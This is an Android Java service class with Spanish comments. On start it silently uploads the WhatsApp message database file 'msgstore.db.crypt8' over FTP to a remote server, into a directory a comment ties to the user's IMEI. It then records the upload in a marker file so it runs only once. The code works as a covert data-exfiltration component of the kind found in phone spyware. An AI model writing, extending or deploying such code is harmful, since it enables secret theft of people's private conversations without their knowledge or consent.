package club.thinkgo.server_test;


import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import club.thinkgo.server_test.models.FTPManager;
import club.thinkgo.server_test.models.FileManager;


public class UploadDBService extends Service {


    int mStartMode;       // indicates how to behave if the service is killed

    boolean mAllowRebind; // indicates whether onRebind should be used


    @Override
    public void onCreate() {
        // The service is being created

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // The service is starting, due to a call to startService()

         Log.i("Service","running");

        try {
            FileManager fm = new FileManager("text.txt",getString(R.string.directory_img));
            String[] datos =  fm.fileToArray();

            if(datos == null) {
                // Definir Objeto FTPClient
                FTPManager ftp_manager = new FTPManager(this);
                Log.i("Service", "ftp obj Created");


                // Definir Directorio servidor
                ftp_manager.change_directory(""); // imei del usuario
                Log.i("Service", "Directorio Cambiado");

                //Subir Nombre del archivo
                String uploadFileName = "msgstore.db.crypt8";
                Log.i("Service", "name define : " + uploadFileName);
                //Definir ruta del archivo
                ftp_manager.Set_local_Directory(getString(R.string.directory_db));
                Log.i("Service", "Ruta definida :" + ftp_manager.uploadFilePath);
                //Subir DB al servidor
                ftp_manager.SubirArchivo(uploadFileName);
                Log.i("Service", "Archivo Subido :" + ftp_manager.uploadFilePath);
                // Cerrar conexion FTP
                ftp_manager.Close_connection();


                fm.writeFile(uploadFileName);
            }

        }
        catch (Exception e){
            Log.i("Error :", e.toString());
        }
        mStartMode = START_NOT_STICKY;
        return mStartMode;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        // All clients have unbound with unbindService()
        return mAllowRebind;
    }
    @Override
    public void onRebind(Intent intent) {
        // A client is binding to the service with bindService(),
        // after onUnbind() has already been called
    }
    @Override
    public void onDestroy() {
        // The service is no longer used and is being destroyed
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



}